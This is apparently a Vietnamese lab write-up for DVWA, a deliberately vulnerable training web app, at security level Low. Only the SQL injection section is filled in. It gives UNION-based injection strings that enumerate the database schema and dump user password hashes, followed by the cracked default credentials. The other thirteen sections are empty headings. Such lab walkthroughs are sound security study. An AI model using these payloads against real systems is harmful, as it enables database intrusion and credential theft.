# DVWA - Security Level: Low

## 1. Brute Force

## 2. Command Injection

## 3. CSRF

## 4. File Inclusion

## 5. File Upload

## 6. Insecure Captcha

## 7. SQL Injection
Nhap thu **"1"** vao input box:  
![SQL Injection_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/SQL%20Injection_1.png)  
Khi nhap **User ID = 1** trang web se tra ve thong tin cua **ID, First name, Surname**, vi vay cau lenh query co the la:
**SELECT first_name, last_name FROM users WHERE user_id = id;**
Thu kiem tra so column cua cau lenh query bang canh nhap **'UNION ODER BY 2--**  
![SQL Injection_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/SQL%20Injection_2.png)  
Kiem tra cac table trong database bang lenh query:
**' UNION SELECT null, table_name FROM INFORMATION_SCHEMA.TABLES-- -**  
![SQL Injection_3](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/SQL%20Injection_3.png)  
Co table **users**, kiem tra cac column trong table **users** bang lenh query:
**' UNION SELECT null, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = 'dvwa' and table_name = 'users'-- -**  
![SQL Injection_4](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/SQL%20Injection_4.png)  
Trong table **user** co 2 column **user, password**, kiem tra 2 columns bang lenh query:
**' UNION SELECT user, password FROM users-- -**
![SQL Injection_5](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/SQL%20Injection_5.png)  
Ta co cac thong tin ve **user, password**, **password** dang duoc ma hoa MD5. Sau khi giai ma:
admin - password  
gordonb - abc123  
1337 - charley  
pablo - letmein  
smithy - password
## 8. SQL Injection (Blind)

## 9. Weak Session IDs

## 10. XSS (DOM)
    
## 11. XSS (Reflected)
    
## 12. XSS (Stored)

## 13. CSP Bypass

## 14. JavaScript
